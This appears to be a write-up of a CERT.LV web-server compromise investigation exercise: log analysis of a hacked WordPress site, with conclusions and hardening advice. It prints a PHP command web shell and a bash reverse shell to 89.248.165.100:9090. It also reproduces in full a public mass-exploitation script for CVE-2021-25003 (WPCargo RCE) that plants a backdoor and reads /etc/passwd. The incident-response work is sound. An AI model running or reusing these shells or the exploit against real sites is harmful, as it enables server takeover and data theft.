---
title: cert.lv web page and log files investigation task
date: 2026-03-06 09:00:00
tags:
---

## Task details


SOC komanda ir noteikusi, ka 07.10.2022. plkst 18:49:20, pēc darba laika, no IP adreses 192.168.28.4 uz IP 104.248.47.214 ir veikts POST pieprasījums.

Sākotnējā analīzē tika identificēts, ka IP adrese 104.248.47.214 ir web serveris, kas uztur lapu jidpw1003ww.com, savukārt 192.168.28.4 ir ministrijas darbinieka dators. Darbinieks apgalvo, ka šādu lapu nav apmeklējis un darbu pie datora bija beidzis 18:00
Ministrijas datora analīze ir uzticēts citam kolēģim.

No web servera ir iegūts web failu saturs un access web žurnālfaili, kur arī ir nepieciešama analīze.

Nepieciešamos failus ir iespējams lejupielādēt:
https://dropit.cert.lv/index.php/s/jEcwxcSLbxdoq2y
```
web
bigfood.tar.gz
access_7.log
access_6.log
access_5.log
```
Incidenta izmeklēšanas ietvaros ir nepieciešams noskaidrot:

# Mājaslapa
1) Kāpēc mājaslapa saņēma šādu pieprasījumu no ministrijas datora?
2) Kādā veidā un kāpēc tika kompromitēta mājaslapa? Ko lapas administratoram vajadzēja darīt, lai mājaslapa nebūtu tikusi kompromitēta?
3) Vai žurnālfailu analīze uzrāda, kādu papildu informāciju, kas saistīta ar iepriekšminēto tīkla plūsmu?

Kopsavilkums: Kādi secinājumi ir pēc incidenta izmeklēšanas beigās un kādas būtu veicamas nākamās darbības?


## Investigation

Only two log entry find with this time `18:49:20` 

```bash
grep -w "18:49:20" access_*.log
access_7.log:190.160.88.9 - - [07/Okt/2022 18:49:20 +0300] "POST / HTTP/1.1" 200 344286 "-" "Go-http-client/1.1"
access_7.log:190.160.88.9 - - [07/Okt/2022 18:49:20 +0300] "POST / HTTP/1.1" 200 13424 "-" "Go-http-client/1.1"

```

Also with IP address `190.160.88.9` two the same entries in log file.

```bash
grep -w "190.160.88.9" access_*.log
access_7.log:190.160.88.9 - - [07/Okt/2022 18:49:20 +0300] "POST / HTTP/1.1" 200 344286 "-" "Go-http-client/1.1"
access_7.log:190.160.88.9 - - [07/Okt/2022 18:49:20 +0300] "POST / HTTP/1.1" 200 13424 "-" "Go-http-client/1.1"
```

Weak WordPress database credentials detected:

```php
/** Database username */
define( 'DB_USER', 'wordpress' );

/** Database password */
define( 'DB_PASSWORD', '12345' );
```

Reviewing the web page files I discovered a PHP web shell script located at:

`/var/www/html/wp-content/themes/twentytwenty/bat.php`

The `bat.php` file does not appear to be included or referenced by any other PHP file.

Looks like that the attackers gained access to the WordPress admin account credentials, enabling them to modify the theme directory.

WEB shell git page -  [https://github.com/k4mpr3t/b4tm4n/tree/master](https://github.com/k4mpr3t/b4tm4n/tree/master)

![image.png](image.png)

Can’t find any evidence in `access_5.log, access_6.log, access_7.log` files that this web shell script was requested. 

![image.png](image1.png)

By inspecting web page files I found PHP web shell script in this path

`/var/www/html/wp-content/plugins/akismet/class.wrapper.php`

```php
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
</html>
```

Don’t have any evidence that this script used. Can’t find in logs that these files was requested. Also file not used as include in any other PHP file.

```bash
grep -w "wrapper.php" access_*.log
```

Reviewing the web page files, I discovered a PHP web reverse shell script located at `/var/www/html/wp-content/abuse-api.php`  File is reverse shell to `ip 89.248.165.100` to `port 9090`

This is backdoor left. This is possible only when uploading/installing plugin from admin interface.

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/89.248.165.100/9090 0>&1'");?>
```

```python
grep abuse-api.php access_*.log
access_6.log:89.248.165.100 - - [06/Oct/2022:07:12:55 +0300] "GET /wp-content/abuse-api.php HTTP/1.1" 200 147 "-" "curl/7.81.0"
```

Looks like used  a vulnerability scanner to identify potential weaknesses and one of the detected vulnerabilities was successfully exploited.

```
grep -w "89.248.165.100" access_*.log

access_6.log:89.248.165.100 - - [06/Oct/2022:07:12:09 +0300] "GET /wp-content/plugins/wpcargo/includes/barcode.php?text=x1x1111x1xx1xx111xx11111xx1x111x1x1x1xxx11x1111xx1x11xxxx1xx1xxxxx1x1x1xx1x1x11xx1xxxx1x11xx111xxx1xx1xx1x1x1xxx11x1111xxx1xxx1xx1x111xxx1x1xx1xxx1x1x1xx1x1x11xxx11xx1x11xx111xx1xxx1xx11x1x11x11x1111x1x11111x1x1xxxx&sizefactor=.090909090909&size=1&filepath=/var/www/html/wp-content/wp-index.php HTTP/1.1" 200 203 "-" "python-requests/2.25.1"
access_6.log:89.248.165.100 - - [06/Oct/2022:07:12:09 +0300] "POST //wp-content/wp-index.php?1=system HTTP/1.1" 200 369 "-" "python-requests/2.25.1"
access_6.log:89.248.165.100 - - [06/Oct/2022:07:12:55 +0300] "GET /wp-content/abuse-api.php HTTP/1.1" 200 147 "-" "curl/7.81.0"
access_6.log:89.248.165.100 - - [06/Oct/2022:07:17:41 +0300] "POST / HTTP/1.1" 200 87239 "-" "Go-http-client/1.1"
```

Used **`CVE-2021-25003`** is a critical vulnerability of the **WPCargo** plugin prior to **6.9.0**. This  allows an unauthenticated attacker to perform remote code execution (RCE) on a WordPress site running a vulnerable version of the plugin.
`Title: WPCargo < 6.9.0 - Unauthenticated RCE`  - [https://github.com/biulove0x/CVE-2021-25003/tree/main](https://github.com/biulove0x/CVE-2021-25003/tree/main)

```python
# @author : biulove0x
# @name   : WP Plugins WPCargo Exploiter
## This is a magic string that when treated as pixels and compressed using the png
## algorithm, will cause <?=$_GET[1]($_POST[2]);?> to be written to the png file
## payload = '2f49cf97546f2c24152b216712546f112e29152b1967226b6f5f50'
## def encode_character_code(c: int):
##     return '{:08b}'.format(c).replace('0', 'x')
## text = ''.join([encode_character_code(c) for c in binascii.unhexlify(payload)])[1:]

# References : https://wpscan.com/vulnerability/5c21ad35-b2fb-4a51-858f-8ffff685de4a

from urllib3.exceptions import InsecureRequestWarning
import concurrent.futures
import requests, re, argparse

print(
'''
############################################
# @author : biulove0x                      #
# @name   : WP Plugins WPCargo Exploiter   #
# @cve    : CVE-2021-25003                 #
############################################
''')
def wpcargo(_target, _timeout=5):
    _payload  = 'x1x1111x1xx1xx111xx11111xx1x111x1x1x1xxx11x1111xx1x11xxxx1xx1xxxxx1x1x1xx1x1x11xx1xxxx1x11xx111xxx1xx1xx1x1x1xxx11x1111xxx1xxx1xx1x111xxx1x1xx1xxx1x1x1xx1x1x11xxx11xx1x11xx111xx1xxx1xx11x1x11x11x1111x1x11111x1x1xxxx'
    _endpoint = 'wp-content/plugins/wpcargo/includes/barcode.php?text='+ _payload +'&sizefactor=.090909090909&size=1&filepath=../../../wp-conf.php'
    _sessionget = requests.Session()
    _headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36'
    }
    def save_result(_result):
        _saved = open('RESULT-WPCRGO.txt', 'a+')
        _saved.write(_result + '\n')
    
    try:
        _sessionget.get(url=_target + _endpoint, headers=_headers, allow_redirects=True, timeout=_timeout)
        _validationshell = _sessionget.post(url=_target + 'wp-content/wp-conf.php?1=system', headers=_headers, allow_redirects=True, data={"2": "cat /etc/passwd"}, timeout=_timeout)
        
        if 'root:x:0:0:root' in _validationshell.text:
            print('[-] ' + _target + 'wp-content/wp-conf.php => Uploaded!')
            save_result(_target + 'wp-content/wp-conf.php?1=system')
        else:
            print('[+] ' + _target + ' Not found!')
    except:
        print('[%] ' + _target + ' Requests failed')

def main(_choose, _target):
    if _choose == 1:
        wpcargo(_target)

    elif _choose == 2:
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            _ur_list = open(_target, 'r').read().split()
            _futures = []

            for _url in _ur_list:
                _futures.append(executor.submit(wpcargo, _target=_url))

            for _future in concurrent.futures.as_completed(_futures):
                if(_future.result() is not None):
                    print(_future.result())
    else:
        exit()   
## SSL Bypass
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
## Setup args
_parser = argparse.ArgumentParser(description='CVE-2021-25003 [ WPCargo < 6.9.0 - Unauthenticated RCE ]')
_parser.add_argument('-t', metavar='example.com', type=str, help='Single target')
_parser.add_argument('-l', metavar='target.txt', type=str, help='Multiple target')
_args = _parser.parse_args()
## Variable args
_singleTarget = _args.t
_multiTarget  = _args.l

if __name__ == '__main__':
    if not _singleTarget == None:
        _choose = 1
        main(_choose, _singleTarget)
    elif not _multiTarget == None:
        _choose = 2
        main(_choose, _multiTarget)
    else:
        print('WpCargo.py --help for using tools')
```

Writes in file `/var/www/html/wp-content/wp-index.php`

![image.png](image2.png)

This file have PHP code inside `<?=$_GET[1] ($_POST[2]);?>`

```elixir
xxd wp-index.php
00000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452  .PNG........IHDR
00000010: 0000 00db 0000 0001 0103 0000 006d e849  .............m.I
00000020: 4a00 0000 0650 4c54 4500 0000 ffff ffa5  J....PLTE.......
00000030: d99f dd00 0000 0970 4859 7300 000e c400  .......pHYs.....
00000040: 000e c401 952b 0e1b 0000 0025 4944 4154  .....+.....%IDAT
00000050: 0899 63d0 f73c 3f3d 245f 4745 545b 315d  ..c..<?=$_GET[1]
00000060: 2824 5f50 4f53 545b 325d 293b 3f3e 8001  ($_POST[2]);?>..
00000070: 0074 7c07 626d 02af 7100 0000 0049 454e  .t|.bm..q....IEN
00000080: 44ae 4260 82                             D.B`.

```

## Conclusions:

1. **Log Analysis Findings:**
    - The log file shows numerous requests using the `Go-http-client/1.1` browser agent  from different IP addresses. This suggests that a computer belonging to the Ministry might be infected with malware and is potentially being used as part of a botnet to automatically scan for and exploit WordPress vulnerabilities.
    - Two log entries were identified at the exact time `18:49:20`, both originating from the IP address `190.160.88.9`. Both entries represent `POST` requests to the root `/` endpoint, using the "Go-http-client/1.1" user agent.
    - No evidence was found in the log files `access_5.log, access_6.log, access_7.log` of direct requests to the discovered malicious files `bat.php` and `class.wrapper.php`.
2. **Malicious Files Identified:**
    - A PHP web shell `bat.php` was discovered in the WordPress theme directory `twentytwenty`. This file has capabilities for file management, database interaction, and executing reverse shell connections. However no evidence in log files it was  used.
    - Another PHP script `class.wrapper.php` in the plugin directory was identified as a simple web-based command execution tool. Similar to `bat.php` no logs show that it was executed.
    - A reverse shell script `abuse-api.php` was found in the WordPress content directory. Logs indicate it was accessed on `06/Oct/2022` by IP `89.248.165.100` using the `curl` command-line tool.
    - Logs show evidence of scanning activity from `89.248.165.100`, suggesting the attacker was actively probing the site for vulnerabilities before executing the payload `abuse-api.php`.
3. **Recommendations:**
    - Immediately remove malicious files `bat.php`, `class.wrapper.php`, `abuse-api.php`.
    - Change all admin and database credentials to strong, unique passwords.
    - Update WordPress core, themes, and plugins to their latest versions to mitigate vulnerabilities.
    - Review server logs for other suspicious IP addresses and block them as necessary.
    - Enable logging and monitoring tools to detect future unauthorized access or changes.
    - Conduct a full security audit of the server and application to identify additional vulnerabilities.

## Preventive Measures:

1. Secure the server:
    - Update WordPress and their plugins and themes to the up-to-date. Automated updating is enabled in `wp-config.php` .
    - Only install trustable WordPress plugins and themes.
    - Remove unused plugins/themes.
    - Remove default admin account.
    - Disable directory listing.
    - Set strong new admin account credentials.
    - Limit login attemps tp prevent BruteForce attacks.
    - Restrict Access by using `.htaccess` or server rules to block access to sensitive directories and files `/wp-content/plugins/`, `/wp-includes/` .
2. Monitor Logs Actively:
    - Implement a logging and monitoring solution Fail2ban to identify and block malicious IPs.
3. Rate Limiting:
    - Limit repeated requests from the same IP within a short timeframe to prevent brute force or automated scanning attempts.
4. Use a Web Application Firewall (WAF):
    - Deploy a WAF like [Wordfence](https://wordpress.org/plugins/wordfence/#description) Security - WordPress plugin for Firewall and security scanner to block malicious traffic.
5. Enable IP Blocking:
    - Block known malicious IPs or configure geolocation-based access restrictions if applicable.
6. Regular Vulnerability Scanning:
    - Scan the site with [WPScan](https://wpscan.com/) for vulnerabilities to detect and mitigate exploitable areas.